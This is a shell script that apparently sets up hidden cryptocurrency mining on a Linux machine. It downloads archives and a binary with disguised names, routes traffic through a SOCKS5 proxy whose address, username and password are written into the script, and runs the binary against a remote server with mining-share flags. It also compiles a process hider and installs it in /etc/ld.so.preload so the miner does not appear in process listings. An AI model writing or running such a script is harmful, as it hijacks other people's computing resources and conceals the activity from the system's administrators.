#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl -y

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 216.131.111.122:1080
socks5_username = QuENTURW
socks5_password = EfAdJ1Qu
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
chmod +x bezzHash

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./bezzHash --url=babeh46.$(echo $(shuf -i 1-99999 -n 1)-T4)@3.215.245.39:443 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
